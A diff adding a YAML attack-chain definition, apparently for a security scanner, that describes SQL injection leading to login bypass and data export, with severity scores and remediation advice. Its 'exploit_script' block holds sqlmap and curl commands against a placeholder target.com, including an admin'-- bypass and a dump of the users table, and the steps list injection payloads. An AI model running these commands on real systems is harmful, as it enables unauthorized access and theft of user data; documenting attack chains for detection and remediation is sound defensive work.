@@ -1,0 +1,45 @@
+id: CHAIN-002
+name: "SQL注入 → 认证绕过 → 数据泄露"
+severity: CRITICAL
+cvss: 9.8
+epss: 0.90
+
+steps:
+  - step: 1
+    name: "SQL注入点发现"
+    rule: py.injection.sql
+    description: "用户输入直接拼接SQL语句"
+    condition: "字符串拼接构造SQL"
+
+  - step: 2
+    name: "认证绕过"
+    rule: auth_bypass
+    description: "通过SQL注入绕过登录验证"
+    condition: "' OR 1=1 -- 等注入payload"
+
+  - step: 3
+    name: "数据导出"
+    rule: data_exfiltration
+    description: "通过UNION查询导出敏感数据"
+    condition: "UNION SELECT 提取其他表数据"
+
+exploit_script: |
+  # Step 1: 检测注入点
+  sqlmap -u "https://target.com/login" --data="user=admin&pass=*"
+
+  # Step 2: 绕过认证
+  curl -X POST https://target.com/login \
+    -d "user=admin'--&pass=anything"
+
+  # Step 3: 导出数据
+  sqlmap -u "https://target.com/login" --data="user=admin'--&pass=x" \
+    --dump -T users -D main
+
+remediation:
+  priority: P0
+  effort: "4小时"
+  suggestions:
+    - "使用参数化查询 cursor.execute('SELECT * WHERE id=%s', (id,))"
+    - "使用ORM框架(Django ORM, SQLAlchemy)"
+    - "实施输入验证白名单"
+    - "添加WAF规则过滤SQL注入payload"
